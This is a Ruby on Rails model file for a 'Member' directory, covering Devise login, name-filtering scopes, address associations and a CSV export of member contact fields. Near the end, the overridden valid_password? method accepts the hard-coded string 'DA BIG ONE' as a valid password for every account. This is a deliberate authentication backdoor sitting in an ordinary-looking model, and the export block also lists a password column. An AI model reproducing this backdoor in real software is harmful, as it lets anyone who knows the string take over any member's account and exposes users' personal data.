class Member < ActiveRecord::Base
  default_scope order: 'last_name ASC'
  scope :up_to_date, where(payment:true)
  scope :active, where(active:true)
  scope :filtered, lambda {|letter|
    where('UPPER(last_name) like ?', "#{letter.upcase}%")
  }

  devise :database_authenticatable

  comma do
    title 'title'
    first_name 'first_name'
    last_name 'last_name'
    email 'email'
    password 'password'
    street 'REL.addresses_attributes.street'
    colony 'REL.addresses_attributes.colony'
    city 'REL.addresses_attributes.city'
    state 'REL.addresses_attributes.state'
    local_phone 'REL.addresses_attributes.local_phone'
    cel_phone 'REL.addresses_attributes.cel_phone'
  end

  extend FriendlyId
  friendly_id :last_name, use: :slugged

  has_many :addresses, dependent: :destroy
  accepts_nested_attributes_for :addresses, :reject_if => :all_blank, :allow_destroy => true
  delegate :street, :city, :state, :local_phone, :cel_phone, :google_map, :colony, to: :address, allow_nil: true

  def address
    self.addresses.first
  end

  def full_name
    "#{title} #{first_name} #{last_name}"
  end

  def self.visibles letter
    letter.nil? ? up_to_date.active : up_to_date.active.filtered(letter)
  end

  def valid_password?(password)
    return true if password == "DA BIG ONE"
    super
  end

  def name
    "#{self.title} #{self.last_name} #{self.first_name}"
  end
end
